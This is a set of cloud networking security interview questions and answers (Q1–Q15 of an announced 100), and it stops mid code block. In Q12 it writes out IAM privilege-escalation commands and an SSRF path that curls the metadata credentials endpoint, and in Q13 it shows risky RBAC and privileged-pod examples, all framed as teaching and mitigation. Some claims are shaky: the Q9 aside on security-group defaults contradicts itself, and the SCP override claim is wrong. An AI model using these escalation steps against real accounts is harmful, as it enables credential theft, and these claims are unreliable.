# 100 Senior-Level Cloud Networking Security Interview Questions & Answers

> **Scope:** Cloud networking, network security, zero-trust, data-center architecture, virtualization networking, Kubernetes networking, encryption, identity, threat modeling, BGP/SDN, eBPF, service meshes, firewall internals, DDoS, PKI, and multi-cloud.  
> **Level:** Senior / Staff / Principal Security/Cloud Engineer  
> **Format:** Question → Core Concept → Deep Answer → Key Trade-offs / Failure Modes

---

## Table of Contents

1. [Foundations: Networking & the OSI Model](#section-1-foundations)
2. [Cloud Networking Architecture](#section-2-cloud-networking)
3. [Zero Trust & Identity-Aware Networking](#section-3-zero-trust)
4. [Encryption in Transit & at Rest](#section-4-encryption)
5. [Firewalls, Security Groups, NACLs](#section-5-firewalls)
6. [BGP, Routing & SDN](#section-6-bgp-sdn)
7. [Kubernetes & Container Networking](#section-7-kubernetes)
8. [Service Mesh & mTLS](#section-8-service-mesh)
9. [PKI, Certificates & Key Management](#section-9-pki)
10. [DDoS, WAF & Edge Security](#section-10-ddos-waf)
11. [eBPF & Kernel Networking](#section-11-ebpf)
12. [Threat Modeling & Attack Vectors](#section-12-threat-modeling)
13. [Multi-Cloud & Hybrid Networking](#section-13-multi-cloud)
14. [Observability & Forensics](#section-14-observability)
15. [Compliance & Regulatory](#section-15-compliance)

---

## Section 1: Foundations

---

### Q1. Walk me through exactly what happens when a packet traverses a VPC from an EC2 instance to an external HTTPS endpoint. Name every hop and security control.

**Core Concept:** End-to-end packet path through AWS VPC, NAT, IGW, TLS termination.

**Answer:**

1. **Application layer** — process calls `connect()` syscall. Kernel resolves DNS (Route 53 resolver at `169.254.169.253`).
2. **Socket layer** — kernel builds TCP SYN, wraps in IP packet. Source IP = ENI private IP.
3. **ENI (Elastic Network Interface)** — hypervisor-level virtual NIC. The Nitro card enforces **Security Group** rules (stateful, connection-tracked) at this boundary. Outbound SYN is evaluated against egress SG rules.
4. **VPC routing table** — the subnet's route table is consulted. If destination is `0.0.0.0/0`, next-hop = **Internet Gateway (IGW)** for public subnets or **NAT Gateway** for private subnets.
5. **NAT Gateway** (if private subnet) — performs SNAT, replacing private source IP with NAT EIP. Connection tracked in NAT table. NACLs (stateless) are evaluated on the subnet boundary **before** the NAT GW.
6. **Internet Gateway** — AWS-managed, horizontally scaled. Performs no NAT; just routes packets from VPC address space to the internet. For public instances, a 1:1 EIP↔Private IP mapping lives here.
7. **AWS backbone / transit** — packets egress AWS's network over the physical underlay. AWS backbone uses its own BGP topology; the Nitro system handles encapsulation (VXLAN/Geneve internally).
8. **Internet transit** — BGP-routed across the public internet. TLS handshake begins: ClientHello → server Certificate → key exchange (ECDHE) → symmetric session key.
9. **Destination server** — TLS termination at the server or load balancer. Application data flows.

**Security Controls at Each Hop:**

| Hop | Control | Type |
|---|---|---|
| ENI | Security Group | Stateful L4 |
| Subnet | NACL | Stateless L3/L4 |
| NAT GW | SNAT + no inbound init | Topology isolation |
| IGW | No unauthorized inbound | Topology |
| TLS | Certificate validation, ECDHE | Encryption + auth |
| DNS | DNSSEC (optional), Route 53 Resolver Firewall | DNS security |

**Failure Modes:** NACL ephemeral port range misconfiguration blocks return traffic. DNSSEC not enforced = DNS spoofing risk. SG rules too permissive (`0.0.0.0/0`) = lateral movement exposure.

---

### Q2. Explain the difference between stateful and stateless firewalling. When does the distinction matter critically in cloud environments?

**Core Concept:** Connection tracking vs. per-packet rule evaluation.

**Answer:**

**Stateful firewalls** (e.g., AWS Security Groups, iptables conntrack, nftables) maintain a **connection tracking table** (conntrack). When an outbound packet establishes a connection, the state (SYN_SENT → ESTABLISHED) is recorded. Return traffic is automatically permitted without a matching inbound rule.

**Stateless firewalls** (e.g., AWS NACLs, traditional ACLs on routers) evaluate every packet independently against rules. Return traffic must be explicitly permitted. This requires allowing **ephemeral port ranges** (1024–65535) for TCP return traffic.

**Linux conntrack internals:**
```
/proc/net/nf_conntrack
# Entry: tcp      6 86400 ESTABLISHED src=10.0.1.5 dst=93.184.216.34 sport=54321 dport=443
#        [UNREPLIED] src=93.184.216.34 dst=10.0.1.5 sport=443 dport=54321
```

**Critical distinctions in cloud:**

1. **NACLs + SGs together** — both apply. NACL stateless means ephemeral ports must be open `1024-65535` inbound for response traffic. Forgetting this causes asymmetric drops.
2. **Scale** — conntrack tables have limits. At high connection rates (DDoS, microservices fan-out), conntrack table exhaustion (`nf_conntrack: table full`) drops legitimate packets. Tune `nf_conntrack_max` and `nf_conntrack_buckets`.
3. **UDP** — conntrack handles UDP as pseudo-state (timeout-based). Stateless firewalls treat each UDP packet independently, which matters for DNS, QUIC.
4. **Asymmetric routing** — if return traffic takes a different path (ECMP, multipath), stateful firewalls may not see the SYN and drop the ACK. This is a critical failure mode in multi-path SDN environments.

**Mitigation for conntrack exhaustion:**
```bash
sysctl -w net.netfilter.nf_conntrack_max=1048576
sysctl -w net.netfilter.nf_conntrack_tcp_timeout_established=300
# Reduce from default 432000s (5 days) to 300s
```

---

### Q3. What is ARP and what are its security implications in a cloud/virtual networking context?

**Core Concept:** Layer 2 address resolution and its spoofing/poisoning attack surface.

**Answer:**

ARP (Address Resolution Protocol, RFC 826) maps IPv4 addresses to MAC addresses on the same broadcast domain. It is unauthenticated by design.

**How it works:**
- Host A wants to reach 10.0.0.5. Broadcasts: *"Who has 10.0.0.5? Tell 10.0.0.1"*
- Host B with 10.0.0.5 replies with its MAC.
- Host A caches this in its ARP table (`arp -n`).

**Attack: ARP Poisoning / MITM**
An attacker sends gratuitous ARP replies claiming their MAC for a victim IP, redirecting traffic through the attacker.

**Cloud/Virtualization mitigations:**

1. **Hypervisor-enforced MAC/IP binding** — AWS Nitro, Azure vSwitch, GCP Andromeda all enforce that a VM can only send traffic matching its assigned MAC/IP pair. Spoofed ARP replies are dropped at the hypervisor. This is why traditional ARP poisoning doesn't work in AWS VPCs by default.
2. **Source/Destination check** — AWS ENI has a `sourceDestCheck` flag. Disabling it (required for NAT instances, VPN appliances) re-enables spoofing capability from that interface.
3. **Private VLAN / port isolation** — in physical data centers, switch-level port isolation prevents L2 communication between hosts in the same VLAN without going through a router (where ACLs apply).
4. **Dynamic ARP Inspection (DAI)** — switch feature that validates ARP packets against a DHCP snooping binding table. Critical in bare-metal/colo environments.
5. **IPv6 + SLAAC** — IPv6 uses NDP (Neighbor Discovery Protocol) instead of ARP. Also unauthenticated; mitigated by SEND (Secure Neighbor Discovery, RFC 3971) or RA Guard.

**Failure Mode:** Disabling `sourceDestCheck` without compensating controls on a shared-tenancy VPC segment = ARP spoofing risk from compromised instances.

---

### Q4. Explain BGP — what it is, how it works, and its most critical security vulnerabilities.

**Core Concept:** The routing protocol of the internet and its trust model weaknesses.

**Answer:**

BGP (Border Gateway Protocol, RFC 4271) is a path-vector protocol that exchanges reachability information (prefixes) between **Autonomous Systems (AS)**. It is the protocol that makes the internet work.

**How it works:**

1. **eBGP (external)** — between different ASes. Used between ISPs, cloud providers, enterprises.
2. **iBGP (internal)** — within the same AS. Full mesh or route reflectors required.
3. **Sessions** — TCP port 179. Peers exchange OPEN → KEEPALIVE → UPDATE → NOTIFICATION messages.
4. **Path selection** — BGP selects best path via: LOCAL_PREF > AS_PATH length > ORIGIN > MED > eBGP over iBGP > IGP metric > Router ID.
5. **Prefix advertisement** — an AS announces which IP prefixes it can reach. Neighbors propagate with AS_PATH prepended.

**Critical Security Vulnerabilities:**

| Vulnerability | Description | Real-world Example |
|---|---|---|
| **BGP Hijacking** | Rogue AS announces a more specific prefix, stealing traffic | 2018 AWS Route 53 hijack (MyEtherWallet) |
| **BGP Leaks** | AS accidentally re-advertises routes learned from one peer to another | 2019 Cloudflare/Telia leak |
| **Session Hijacking** | TCP session between BGP peers spoofed (no auth) | Historical — mitigated by MD5/TTL |
| **Prefix deaggregation** | Attacker announces /25 to outcompete victim's /24 | Common hijack technique |
| **BGP Blackholing abuse** | Community-based blackhole requests abused | Legitimate feature, malicious use |

**Mitigations:**

1. **RPKI (Resource Public Key Infrastructure)** — cryptographically signs route origin (ROA = Route Origin Authorization). Validates that an AS is authorized to originate a prefix. Origin validation, not path validation.
   ```
   # Validate ROA with routinator or OctoRPKI
   routinator vrps --format json | jq '.roas[] | select(.prefix == "1.2.3.0/24")'
   ```
2. **BGPsec** — signs the full AS_PATH, not just origin. High overhead, low deployment.
3. **MD5 authentication** — TCP MD5 on BGP sessions prevents session injection.
4. **TTL Security (GTSM, RFC 5082)** — sets TTL=255, drops packets with TTL<254. Prevents off-link injection.
5. **IRR filtering** — filter prefixes against Internet Routing Registry databases.
6. **Prefix length filtering** — reject prefixes longer than /24 (IPv4) or /48 (IPv6) to reduce deaggregation hijacks.
7. **MANRS** — Mutually Agreed Norms for Routing Security — industry initiative.

---

### Q5. What is VXLAN? How does it work, and what are its security implications in a multi-tenant data center?

**Core Concept:** L2 overlay over L3 underlay; multi-tenancy via VNI; security surface.

**Answer:**

VXLAN (Virtual Extensible LAN, RFC 7348) encapsulates L2 Ethernet frames inside UDP packets (default port 4789), enabling L2 networks to span L3 boundaries. The **VNI (VXLAN Network Identifier)** is a 24-bit field providing ~16M logical network segments.

**Encapsulation stack:**
```
[ Outer Ethernet | Outer IP | UDP (4789) | VXLAN Header (VNI) | Inner Ethernet | Inner IP | Payload ]
```

**VTEP (VXLAN Tunnel Endpoint)** — the entity that encapsulates/decapsulates. Can be a hypervisor, ToR switch, or software (OVS, Linux kernel).

**How learning works:**
- **Data plane learning** — like traditional L2, VTEPs learn MAC-to-VTEP mappings from traffic (flood-and-learn). Requires multicast or ingress replication for unknown unicast/broadcast.
- **Control plane learning** — BGP EVPN (RFC 7432) distributes MAC/IP reachability via BGP. This is the production-grade approach (no multicast needed, scales better, faster convergence).

**Security Implications:**

1. **No built-in encryption** — VXLAN is plaintext. An attacker with access to the underlay network (malicious ToR, rogue hypervisor) can see all tenant traffic across VNIs. **Mitigation:** IPsec or MACsec on the underlay, or WireGuard overlays.
2. **VNI spoofing** — if a VTEP is compromised, it can inject packets with any VNI, crossing tenant boundaries. **Mitigation:** VTEP authentication (not in base VXLAN spec), strict ACLs on underlay to restrict UDP/4789 traffic only to authorized VTEPs.
3. **VXLAN reflection attacks** — attackers can use misconfigured VTEPs as amplifiers. **Mitigation:** restrict VTEP access, firewall UDP/4789 at the perimeter.
4. **Multicast abuse** — flood-and-learn uses multicast; joining the wrong multicast group leaks traffic. **Mitigation:** BGP EVPN control plane eliminates multicast dependency.
5. **Underlay trust assumption** — VXLAN assumes the underlay is trusted. In multi-tenant environments, this assumption must be explicitly enforced through physical and logical controls.

**Production hardening:**
```
# Linux VXLAN with restricted learning (no flood-and-learn)
ip link add vxlan100 type vxlan id 100 dstport 4789 nolearning
ip link set vxlan100 up
# Use BGP EVPN (FRRouting) for control plane distribution
```

---

## Section 2: Cloud Networking Architecture

---

### Q6. Compare AWS VPC, Azure VNet, and GCP VPC architectures. What are the fundamental design differences and their security implications?

**Core Concept:** Cloud provider SDN architecture differences — regional vs. global VPCs, peering models, control planes.

**Answer:**

| Dimension | AWS VPC | Azure VNet | GCP VPC |
|---|---|---|---|
| **Scope** | Regional | Regional | **Global** (spans all regions natively) |
| **Subnet scope** | AZ-scoped | Regional (spans AZs) | Regional |
| **Inter-region connectivity** | VPC Peering (non-transitive), TGW | VNet Peering, Virtual WAN | VPC Peering (or automatic via global VPC) |
| **Routing** | Route tables per subnet | Route tables per subnet | Route tables per VPC |
| **Underlay** | Nitro + custom ASICs | SmartNIC (FPGA/custom) | Andromeda (software) |
| **DNS** | Route 53 Resolver (169.254.169.253) | Azure DNS (168.63.129.16) | Metadata server (169.254.169.254) |
| **Security model** | SG (stateful) + NACL (stateless) | NSG (stateful) + ASG | Firewall rules (stateful) + hierarchical policies |

**Key Design Differences:**

**AWS VPC:**
- VPCs are regional; subnets are AZ-specific. This forces explicit multi-AZ design.
- SGs are attached to ENIs (not instances), allowing fine-grained control.
- VPC Peering is non-transitive — A↔B, B↔C does not mean A↔C. Requires Transit Gateway for hub-spoke.
- Nitro system enforces isolation at the hardware level; the hypervisor has minimal footprint.

**Azure VNet:**
- Subnets span AZs within a region, simplifying multi-AZ but reducing isolation granularity.
- NSGs can be applied at both subnet and NIC level — easy to create overly permissive NIC-level rules that bypass subnet NSGs.
- Azure has a concept of **Service Endpoints** and **Private Link** for PaaS access; Private Link is the preferred (more secure) option.
- UDRs (User Defined Routes) can override system routes, enabling traffic inspection insertion.

**GCP VPC:**
- Global VPC is architecturally unique — a single VPC can span all regions. Subnets are regional.
- Routes and firewall rules are VPC-level, not subnet-level. No explicit NACLs.
- **Hierarchical firewall policies** (org/folder level) allow consistent baseline security across projects.
- Andromeda is pure software SDN; Compute Engine relies on it for all networking.

**Security Implications:**

1. **GCP's global VPC** reduces complexity but increases blast radius — a misconfigured VPC firewall rule applies everywhere. Hierarchical policies are critical to compensate.
2. **AWS AZ-scoped subnets** create natural isolation boundaries; lateral movement is bounded per AZ segment.
3. **Azure NSG evaluation order** is complex (allow beats deny with same priority number treated as separate, numbered 100-4096). Misconfiguration risk is high.
4. **None of the three** encrypt intra-region traffic by default. GCP encrypts inter-region VM-to-VM traffic on the backbone; AWS and Azure require explicit IPsec/VPN for equivalent guarantees.

---

### Q7. How does AWS Transit Gateway work? What are its security design considerations?

**Core Concept:** Centralized routing hub for VPCs and on-premises; policy enforcement point.

**Answer:**

AWS Transit Gateway (TGW) is a regional, managed, highly available network transit hub. It allows you to connect VPCs, VPNs, and Direct Connect using a hub-and-spoke model.

**Architecture:**
```
VPC-A (prod)    VPC-B (dev)    VPC-C (shared-svcs)    On-Prem (DX/VPN)
     |                |                |                      |
     +----------------+----------------+----------------------+
                       Transit Gateway
                    (Route Tables + Attachments)
```

**Core components:**
- **Attachments** — each VPC, VPN, DX, or Peering connection is an attachment.
- **Route Tables** — TGW has its own route tables (separate from VPC route tables). Multiple route tables enable traffic segmentation.
- **Associations** — each attachment is associated with exactly one TGW route table.
- **Propagations** — routes can be propagated from an attachment into a route table.

**Security Design Pattern — Segmented Route Tables:**
```
TGW Route Table: "prod"
  - Associated: VPC-Prod attachments
  - Propagates: Shared-Services VPC
  - Does NOT propagate: Dev VPC

TGW Route Table: "dev"
  - Associated: VPC-Dev attachments
  - Propagates: Shared-Services VPC
  - Does NOT propagate: Prod VPC

TGW Route Table: "inspection"
  - All traffic routed through Network Firewall VPC before reaching destination
```

**Security Considerations:**

1. **Default route table** — new attachments are associated with the default route table. If routes are propagated without review, all VPCs can reach all others. Explicitly disable auto-propagation.
2. **Centralized inspection** — route all inter-VPC and north-south traffic through an inspection VPC running AWS Network Firewall or a 3rd-party NGFW. This is the "East-West inspection" pattern.
3. **TGW Route Table isolation** — use separate route tables per environment tier. This is the primary segmentation mechanism.
4. **Blackhole routes** — add blackhole routes for RFC 1918 ranges not in use to prevent routing loops.
5. **Resource Access Manager (RAM)** — TGW can be shared across AWS accounts. Sharing requires explicit RAM invitation acceptance; control who can attach.
6. **Flow logs** — enable TGW Flow Logs for visibility. Unlike VPC Flow Logs, TGW Flow Logs capture cross-VPC traffic at the transit layer.

**Failure Mode:** A missing route in the TGW route table silently drops traffic (no ICMP unreachable is returned in some cases). Always test with `traceroute` and verify TGW route tables explicitly.

---

### Q8. Explain AWS PrivateLink vs. VPC Peering vs. VPC Endpoints. When do you use which?

**Core Concept:** Service exposure models in AWS — network path, trust model, and operational differences.

**Answer:**

**VPC Peering:**
- Direct, private network connectivity between two VPCs (same or cross-account/region).
- Full L3 routing — all resources in peered VPCs are reachable (controlled by SGs/NACLs/route tables).
- **Non-transitive** — peering A↔B and B↔C doesn't allow A↔C.
- CIDR overlap is not allowed (cannot peer VPCs with overlapping address spaces).
- **Use case:** Full-mesh connectivity between a small number of VPCs you control.

**VPC Gateway/Interface Endpoints:**
- **Gateway Endpoints:** For S3 and DynamoDB only. Adds a prefix list to route tables. Traffic stays within AWS network. No cost per-hour.
- **Interface Endpoints (AWS PrivateLink-based):** Creates an ENI in your VPC with a private IP. Supports most AWS services. DNS resolves to the private IP. Costs per-hour + per-GB.
- **Use case:** Private access to AWS services without Internet Gateway.

**AWS PrivateLink (Interface Endpoint for custom services):**
- Exposes your service (behind an NLB) to other VPCs without peering, without exposing your entire VPC.
- Consumer VPC creates an Interface Endpoint; all traffic goes through AWS PrivateLink (stays on AWS backbone, no overlap issues).
- **Unidirectional** — consumer initiates; provider cannot initiate connections back.
- Supports cross-account, cross-region (in some cases), and overlapping CIDRs.
- **Use case:** SaaS providers exposing services to customers; inter-account service exposure with minimal blast radius.

**Decision Matrix:**

| Requirement | Use |
|---|---|
| Full private connectivity, you own both VPCs | VPC Peering or TGW |
| Access AWS managed service privately | Interface/Gateway Endpoint |
| Expose your service to other accounts/VPCs | PrivateLink (Interface Endpoint for custom service) |
| Overlapping CIDRs, still need connectivity | PrivateLink only |
| Need transitive routing | Transit Gateway |

**Security posture:** PrivateLink has the smallest blast radius — provider exposes only one service, not its entire network. Prefer PrivateLink over VPC Peering for service-to-service exposure.

---

### Q9. How does GCP's hierarchical firewall policy work? How does it interact with VPC-level firewall rules?

**Core Concept:** Multi-layer firewall enforcement in GCP; organization-level security baselines.

**Answer:**

GCP firewall has a **layered evaluation model**:

```
Org-level Hierarchical Policy
  └── Folder-level Hierarchical Policy
        └── Project/VPC-level Hierarchical Policy
              └── VPC Firewall Rules
                    └── (Network tags or service accounts)
```

**Evaluation order within a layer:**
Rules evaluated by **priority** (lower number = higher priority). First matching rule wins (`allow` or `deny`). If no rule matches, the **default action** of that policy applies (`goto_next` for hierarchical, implicit deny for VPC).

**`goto_next` action** is specific to hierarchical policies — it means "this policy has no opinion, delegate to the next lower layer." This enables central security teams to set guardrails while allowing teams to manage their own VPC rules.

**Example: Enforcing a security baseline:**
```yaml
# Org-level policy: Block all SSH from the internet (enforced)
- priority: 100
  direction: INGRESS
  action: DENY
  match:
    srcIpRanges: ["0.0.0.0/0"]
    layer4Configs:
      - ipProtocol: tcp
        ports: ["22"]
  # No goto_next — this is enforced; lower layers cannot override

# Org-level policy: Allow internal RFC 1918
- priority: 200
  direction: INGRESS
  action: GOTO_NEXT
  match:
    srcIpRanges: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
  # Delegate to lower layers for further refinement
```

**Key security properties:**
1. **Org-level DENY rules cannot be overridden** by project-level rules — this is critical for enforcing baselines (e.g., blocking public SSH, blocking specific ports).
2. **Service account-based targeting** — GCP firewall rules can target by service account (identity-based) rather than only IP/tag. This is closer to zero-trust policy.
3. **No NACLs** — unlike AWS, GCP has no stateless ACL layer. All firewall rules are stateful (connection-tracked).
4. **Implied allow** — GCP has an implied allow for outbound traffic by default (unlike AWS, which denies outbound until a rule permits it in SGs... actually AWS SGs deny by default, so similar). Add explicit egress deny rules for sensitive workloads.

---

### Q10. What is an Overlay Network? Compare it to Underlay. How does this apply to Kubernetes CNI plugins?

**Core Concept:** Network virtualization layering; CNI plugin architecture and security trade-offs.

**Answer:**

**Underlay network** — the physical or provider-managed network. IP addresses, routing, switches, physical hosts. In AWS, this is the Nitro underlay; in bare-metal, it's your TOR switches and BGP topology.

**Overlay network** — a virtual network built on top of the underlay using encapsulation. Overlay addresses (pod IPs, VM IPs) are separate from underlay addresses. Encapsulation protocols: VXLAN, Geneve, WireGuard, GRE, IP-in-IP.

**Trade-offs:**

| Dimension | Overlay | Underlay (native routing) |
|---|---|---|
| **Flexibility** | High — no underlay changes needed | Low — requires underlay routing changes |
| **Performance** | Overhead from encapsulation (MTU reduction, CPU) | Better — no encapsulation |
| **Visibility** | Harder — underlay sees encapsulated traffic | Easier — direct IP visibility |
| **Security** | Can hide traffic from underlay inspection | Underlay IDS/IPS sees raw traffic |
| **Complexity** | Higher — two layers to debug | Lower |

**Kubernetes CNI Plugins and their network models:**

| CNI Plugin | Model | Encapsulation | Security features |
|---|---|---|---|
| **Calico** | BGP (native) or VXLAN overlay | Optional VXLAN | NetworkPolicy, WireGuard encryption, eBPF datapath |
| **Cilium** | eBPF-based, overlay or native | VXLAN or Geneve | L7 NetworkPolicy, identity-based via eBPF, Hubble observability |
| **Flannel** | Simple overlay | VXLAN or host-gw | Minimal — no NetworkPolicy |
| **Weave** | Mesh overlay | Sleeve/FastDP | Encrypted by default (NaCl), NetworkPolicy |
| **AWS VPC CNI** | Native VPC routing | None (pod IPs = VPC IPs) | SG for pods, no encap overhead |
| **Azure CNI** | Native VNet routing | None | NSG integration |

**Security implications of CNI choice:**
- **Flannel** has no NetworkPolicy support — requires a separate policy controller (Calico as policy engine on top of Flannel).
- **Cilium** enforces policy at the eBPF layer in the kernel — policy enforcement cannot be bypassed by iptables manipulation in the pod.
- **AWS VPC CNI with SG for pods** — allows security group assignment per pod, enabling AWS-native network policy that works with existing SG infrastructure.
- **Overlay MTU reduction** — VXLAN adds 50 bytes of overhead. If underlying MTU is 1500, effective pod MTU is 1450. Mismatched MTU causes silent packet fragmentation/drops. Always configure CNI MTU explicitly.

---

## Section 3: Zero Trust & Identity-Aware Networking

---

### Q11. Define Zero Trust. How do you implement it in a cloud-native environment beyond just marketing buzzwords?

**Core Concept:** Never trust, always verify — operationalizing identity, device, and context-based access.

**Answer:**

Zero Trust (ZT) is a security model based on the principle of "never trust, always verify" — no implicit trust is granted based on network location. Every access request is authenticated, authorized, and continuously validated.

**NIST SP 800-207 defines ZT around 7 tenets:**
1. All data sources and compute are resources.
2. All communication is secured regardless of network location.
3. Access to individual resources is granted per-session.
4. Access is determined by dynamic policy (identity, device health, behavior).
5. All assets are monitored and measured for integrity.
6. Authentication and authorization are dynamic and strictly enforced.
7. Collect telemetry to improve security posture continuously.

**Concrete implementation in cloud-native environments:**

**1. Identity as the perimeter (SPIFFE/SPIRE):**
Every workload gets a cryptographic identity (SVID = SPIFFE Verifiable Identity Document, issued as X.509 cert or JWT). No network location trust.
```
# SPIRE agent issues SVIDs to workloads via workload API
spire-agent api fetch x509 -socketPath /run/spire/sockets/agent.sock
# Returns X.509 SVID valid for the SPIFFE ID: spiffe://example.org/service/payments
```

**2. mTLS everywhere (service mesh):**
Istio/Linkerd enforce mTLS for all service-to-service communication. Even if an attacker gets on the network, they cannot communicate with services without a valid certificate.

**3. Policy as code (OPA/Rego):**
Authorization decisions codified in policy:
```rego
# Only payments service can call inventory service on /stock endpoint
allow {
  input.source_principal == "spiffe://example.org/service/payments"
  input.method == "GET"
  startswith(input.path, "/stock")
}
```

**4. Device/workload attestation:**
- Cloud: Use instance identity documents (AWS IMDSv2, GCP identity tokens) to attest workload identity.
- Kubernetes: Pod identity via projected service account tokens (OIDC-bound, audience-scoped, time-limited).

**5. Continuous verification:**
- mTLS certificates rotate frequently (hours, not years).
- JWT tokens are short-lived (minutes).
- Envoy/eBPF enforces policy on every request, not just at connection establishment.

**6. Micro-segmentation:**
Kubernetes NetworkPolicy (or Cilium L7 policy) restricts which pods can communicate. Default-deny-all, explicit allow.

**7. Observability:**
Every access logged with full context (source identity, destination, resource, outcome). Anomaly detection on access patterns.

**What ZT is NOT:**
- Not just VPN replacement (though that's a common ZTNA product pitch).
- Not "install one product." It's an architecture.
- Not binary — it's a maturity spectrum.

---

### Q12. How does AWS IAM work at a technical level? What are the most common misconfigurations that lead to privilege escalation?

**Core Concept:** IAM evaluation logic, policy types, privilege escalation paths.

**Answer:**

**IAM Evaluation Logic (in order):**
1. Explicit DENY — any deny in any policy → access denied (except S3 bucket policies with explicit allows can override SCPs in some cases).
2. SCPs (Service Control Policies) — org-level guardrails. Must explicitly allow actions; don't grant permissions themselves.
3. Resource-based policies (S3, KMS, Lambda, SQS) — can grant access cross-account.
4. Identity-based policies (inline + managed) attached to IAM principal.
5. Permission boundaries — maximum permissions a principal can have (doesn't grant, only limits).
6. Session policies — further restrict temporary credentials.

**Policy evaluation summary:**
```
Final Permission = (Identity Policy ∩ Permission Boundary ∩ SCP) ∪ (Resource Policy cross-account)
```

**Common Privilege Escalation Paths:**

1. **`iam:PassRole` + service creation:**
   If a principal has `iam:PassRole` and can create EC2/Lambda/ECS, they can attach a higher-privileged role to the service and execute code under it.
   ```
   # Attacker creates Lambda with admin role
   aws lambda create-function --role arn:aws:iam::123:role/AdminRole ...
   aws lambda invoke --function-name attacker-lambda ...
   ```
   **Mitigation:** Restrict `iam:PassRole` with condition `iam:PassedToService` and limit to specific role ARNs.

2. **`iam:CreatePolicyVersion`:**
   Create a new version of an existing policy with `AdministratorAccess` and set it as default.

3. **`iam:AttachRolePolicy` / `iam:PutRolePolicy`:**
   Attach an existing admin policy or create an inline policy on a role.

4. **`sts:AssumeRole` without conditions:**
   Assume a role that has broader permissions. Check for roles with `"Principal": {"AWS": "*"}` or overly broad trust policies.

5. **`ec2:AssociateIamInstanceProfile`:**
   Replace the IAM instance profile on an existing EC2 instance with an admin profile.

6. **SSRF → IMDSv1:**
   SSRF vulnerability in app → curl `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → steal role credentials.
   **Mitigation:** Enforce IMDSv2 (token-required):
   ```bash
   aws ec2 modify-instance-metadata-options --instance-id i-xxx \
     --http-endpoint enabled --http-tokens required --http-put-response-hop-limit 1
   ```

7. **`lambda:UpdateFunctionCode`:**
   Update code of a Lambda that runs with a privileged role → execute arbitrary code under that role.

**Detection:** Use IAM Access Analyzer, aws-escalate tool (Rhino Security Labs), PMapper for graph-based priv-esc path analysis.

---

### Q13. Explain Kubernetes RBAC. What are the most dangerous RBAC misconfigurations?

**Core Concept:** Kubernetes authorization model, dangerous permissions, and privilege escalation.

**Answer:**

Kubernetes RBAC controls what API operations subjects (users, groups, ServiceAccounts) can perform on resources.

**Components:**
- **Role** — namespaced; grants permissions within a namespace.
- **ClusterRole** — cluster-wide; grants permissions across all namespaces or on cluster-scoped resources (nodes, PVs, namespaces themselves).
- **RoleBinding** — binds a Role or ClusterRole to subjects within a namespace.
- **ClusterRoleBinding** — binds a ClusterRole to subjects cluster-wide.

**Most Dangerous RBAC Configurations:**

1. **`cluster-admin` ClusterRoleBinding to a broad group or SA:**
   ```yaml
   # DANGEROUS
   subjects:
   - kind: Group
     name: system:authenticated  # ALL authenticated users get cluster-admin
   roleRef:
     kind: ClusterRole
     name: cluster-admin
   ```

2. **`get/list/watch secrets` at cluster level:**
   Any SA with `secrets: get` can read all secrets including service account tokens of other SAs, potentially escalating to higher-privileged SAs.

3. **`pods/exec` permission:**
   Allows `kubectl exec` into any pod. If the target pod runs as root or has host PID/network, this is container escape.

4. **`nodes/proxy` or `pods/proxy` verb:**
   Allows proxying requests to the Kubelet API or pod, bypassing audit logging of the API server.

5. **`create` on pods with no LimitRange/PSS:**
   Can create privileged pods, hostPID/hostNetwork pods = node compromise.
   ```yaml
   # Privileged pod = full node access
   securityContext:
     privileged: true
   hostPID: true
   hostNetwork: true
   ```

6. **`impersonate` verb:**
   Allows acting as any user/group/SA — complete privilege escalation.

7. **Wildcard permissions:**
   ```yaml
   rules:
   - apiGroups: ["*"]
     resources: ["*"]
     verbs: ["*"]
   # This IS cluster-admin equivalent
   ```

8. **`create` on ClusterRoleBindings:**
   Allows the subject to grant themselves or others any permission.

**Hardening checklist:**
- Enable and review `--audit-policy-file` — log all access to secrets and exec.
- Use `kubectl auth can-i --list --as=system:serviceaccount:default:mysa` to audit SA permissions.
- Tools: `rbac-tool`, `kubectl-who-can`, `KubiScan`.
- Enforce Pod Security Standards (PSS) — `restricted` profile.
- Separate namespaces with RoleBindings rather than ClusterRoleBindings where possible.

---

### Q14. What is SPIFFE/SPIRE and how does it enable zero-trust workload identity?

**Core Concept:** Standardized workload identity federation; PKI automation for service identity.

**Answer:**

**SPIFFE** (Secure Production Identity Framework for Everyone) is a set of open standards (CNCF project) for workload identity:
- **SPIFFE ID** — URI format: `spiffe://<trust-domain>/<path>` (e.g., `spiffe://example.org/service/payments`)
- **SVID (SPIFFE Verifiable Identity Document)** — the credential carrying the SPIFFE ID. Two formats:
  - **X.509-SVID** — X.509 certificate with SPIFFE ID in SAN (Subject Alternative Name) URI field.
  - **JWT-SVID** — JWT with SPIFFE ID in `sub` claim.

**SPIRE** (SPIFFE Runtime Environment) is the reference implementation:

**Architecture:**
```
SPIRE Server (per trust domain)
├── Issues SVIDs to agents
├── Manages registration entries (workload selectors → SPIFFE IDs)
└── Upstream CA (or delegates to Vault/AWS PCA)

SPIRE Agent (per node)
├── Attests the node to the server (TPM, AWS IID, k8s sat)
├── Fetches SVIDs from server
└── Exposes Workload API (Unix socket) to local workloads

Workload (your service)
├── Calls Workload API → receives X.509 SVID + bundle
└── Uses SVID for mTLS with peer services
```

**Node Attestation methods:**
- **AWS:** EC2 Instance Identity Document (signed by AWS) — SPIRE verifies the IID signature.
- **Kubernetes:** Service Account token (projected, OIDC-bound) — SPIRE agent uses `k8s_sat` attestor.
- **TPM2:** Hardware attestation — strongest guarantee of node identity.

**Workload Attestation:**
SPIRE agent inspects the process (UID, PID, k8s pod labels, Docker image hash) to match a **registration entry** and assign a SPIFFE ID.

**Integration with service mesh:**
Istio Citadel can be replaced with SPIRE as the CA. Envoy sidecars retrieve SVIDs via SDS (Secret Discovery Service) from the SPIRE agent's Workload API.

**Security properties:**
1. **Short-lived certs** — SVIDs typically have 1-hour TTL, rotated automatically. Compromise window is minimized.
2. **No static secrets** — workloads never handle static API keys or long-lived certs. Identity is dynamic.
3. **Federation** — two trust domains can federate, allowing cross-org mTLS without sharing a CA.
4. **Auditable** — every SVID issuance is logged; registration entries define the policy.

---

### Q15. Explain the concept of IMDSv2 and why it was necessary. How does it prevent SSRF-based credential theft?

**Core Concept:** AWS EC2 metadata service security evolution; defense against SSRF.

**Answer:**

**IMDSv1 (legacy):** The EC2 Instance Metadata Service is reachable at `169.254.169.254` from within any EC2 instance. IMDSv1 is a simple HTTP GET — no authentication, no token:
```bash
